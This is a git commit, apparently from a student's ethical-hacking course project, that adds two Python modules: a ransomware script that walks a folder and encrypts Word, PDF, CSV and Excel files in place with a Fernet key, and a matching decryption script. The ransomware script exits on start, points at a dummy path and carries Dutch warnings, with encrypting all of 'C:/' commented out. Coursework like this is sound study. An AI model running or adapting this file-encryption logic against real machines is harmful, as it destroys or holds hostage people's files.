93fe291b7271ae91b6e24ee063b53e03bf4e46aa
Michiel Hoerée <michielhoeree@hotmail.com>
2025-01-03 14:51:11 +0100

    encryption module gemaakt. momenteel inactief gemaakt voor veiligheid

---
+++ modules/decrypt.py
@@ -0,0 +1,34 @@
+from cryptography.fernet import Fernet
+from dotenv import load_dotenv
+import os
+
+
+
+def decrypt_file(key,file_path):
+    fernet = Fernet(key)
+    with open(file_path, 'rb') as file:
+        encrypted  = file.read()
+    decrypted  = fernet.decrypt(encrypted)
+    with open(file_path, 'wb') as dec_file:
+        dec_file.write(decrypted)
+
+
+load_dotenv(dotenv_path='./.env',override=True)
+ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')            # voor testing heb ik geen env file. daarom kan het zijn dat ik dat manueel moet ingeven
+
+
+if ENCRYPTION_KEY == None:
+    ENCRYPTION_KEY = input("input u key").strip().encode()
+
+key = ENCRYPTION_KEY
+
+file_types = ["docx", "pdf", "csv", "xlsx"]   # , "md", "txt"
+
+# path = "C:/"                     # voor alle files af te runnen ipv 1 file
+path = "C:/Users/michi/School/AP/jaar4/ethicalHacking/Deel2/trojan/modules"
+for root, dirs, files in os.walk(path):
+    for file in files:
+        file_path = os.path.join(root, file)
+        if file.split(".")[-1] in file_types:
+            print(file_path)
+            decrypt_file(key,file_path)
---
+++ modules/ransomware.py
@@ -0,0 +1,43 @@
+import os
+from cryptography.fernet import Fernet
+from dotenv import load_dotenv, set_key
+
+
+print("Dit is iets te gevaarlijk zo maar te runnen. pls lees lines 6-11 van dit script")
+exit()
+# omdat dit script alle files op je pc zal proberen encrypteren is het best om zelf een folder te selecteren die geencrypeert mag worden
+# haal line 36 uit comment als je echt wilt riskeren al je files kwijt te zijn.
+# anders kan je line 37 aan passen om een veilige map aan te duiden.
+# Ik doe dit niet in een config omdat dit standaard niet een optie moet zijn
+
+
+
+def encrypt_file(key,file_path):                # PLAYING WITH FIRE!!!!!!!!!!!!!!!
+    fernet = Fernet(key)
+    with open(file_path, 'rb') as file:
+        original = file.read()
+    encrypted = fernet.encrypt(original)
+    with open(file_path, 'wb') as encrypted_file:
+        encrypted_file.write(encrypted)
+
+
+
+load_dotenv(dotenv_path='./.env',override=True)
+ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')
+
+if ENCRYPTION_KEY == None:
+    key = Fernet.generate_key()
+    try:
+        set_key('.env',"ENCRYPTION_KEY",key)
+    except:
+        print(key)
+    file_types = ["docx", "pdf", "csv", "xlsx"]   # , "md", "txt"
+
+    # path = "C:/"                     # voor alle files af te runnen ipv 1 file
+    path = "C:/DitISGEENPAth"
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            # print(file.split("."))
+            if file.split(".")[-1] in file_types:
+                encrypt_file(key,file_path)
